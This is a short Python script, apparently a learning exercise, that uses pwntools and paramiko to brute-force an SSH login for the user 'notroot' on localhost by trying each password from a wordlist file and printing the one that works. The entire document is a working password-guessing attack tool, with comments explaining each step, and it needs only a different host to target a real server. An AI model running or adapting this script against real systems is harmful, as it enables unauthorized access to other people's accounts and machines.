from pwn import *
import paramiko

host = "127.0.0.1"
username = "notroot"
attempts = 0

with open("best110.txt", "r") as password_list: #opening password file
	for password in password_list: #iterating over each password
		password = password.strip("\n") #cleaning the password up
		try:
			print("[{}] Attempting password: '{}'! ".format(attempts,password))
			response = ssh(host=host, user=username, password=password, timeout=1) #uses the pwn module to make a connection using the password
			if response.connected(): #checks whether the response is valid
				print("[>] Valid password found: '{}'' !".format(password)) #displays a password to the screen if a valid one is found
				response.close() # closes the connection if the password is correct
				break #breaks the loop if a correct password is found
			response.close() #closes the connection if an incorrect password is tried and the connection is reopened to try another password

		except paramiko.AuthenticationException:
			print("[X] Invalid password!")
		attempts += 1